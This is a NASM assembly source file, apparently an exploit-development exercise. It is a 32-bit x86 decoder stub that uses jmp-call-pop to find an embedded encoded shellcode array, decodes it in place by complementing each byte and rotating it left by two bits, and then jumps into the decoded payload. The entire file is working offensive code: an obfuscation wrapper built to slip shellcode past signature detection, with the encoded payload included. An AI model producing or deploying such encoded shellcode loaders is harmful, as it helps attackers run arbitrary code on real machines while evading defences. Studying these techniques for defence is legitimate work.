 ; Filename: decoder.nasm
 ; Author: Kunal Pachauri
 ; Purpose: Decode the shellcode in memory and transfer execution to it
 ; Decode Rule: Compliment the byte and rotate Left by 2 bits

global _start			; Making Entry point accessible

section .text
_start:				; Entry Point
	jmp short call_decoder	; Using Jump-Call-Pop to get the address of encoded Shellcode

decoder:
	pop esi			; Storing the address of Shellcode in ESI
decode:
	xor eax, eax		; Zeroing out EAX (to be used to perform decode operation on a byte)
	xor ebx, ebx		; Zeroing out EBX (to be used to compare end of shellcode by comparing it with 0xbb)
	mov al, byte [esi]	; Moving the byte to be processed into lower half of EAX
	not al			; (1) One's Compliment the byte
	rol al, 2		; (2) Rotate the byte by 2
	mov byte [esi],al	; Storing the decoded byte back to its position pointed by ESI

	lea esi, [esi+1]	; Checking end of shellcode (loading the address of next byte in ESI)
	mov bl, [esi]		; Storing the value in lower EBX to compare with 0xbb
 	cmp bl, 0xbb		; Checking if the next byte is 0xbb (i.e end of shellcode)
	je short Shellcode	; If 0xbb found, transfer execution to starting of decoded shellcode	
	jmp short decode	; If there are remaining bytes, repeat the decode instructions

call_decoder:
	call decoder		; This will store the address of next instruction i.e our encoded Shellcode in Stack
	Shellcode: db 0xb3,0xcf,0xeb,0xe5,0x34,0x34,0x23,0xe5,0xe5,0x34,0x67,0xa5,0x64,0x9d,0x07,0xeb,0x9d,0x47,0x2b,0x9d,0x87,0xd3,0x3d,0x8c,0xdf,0xbb ; Encoded Shellcode
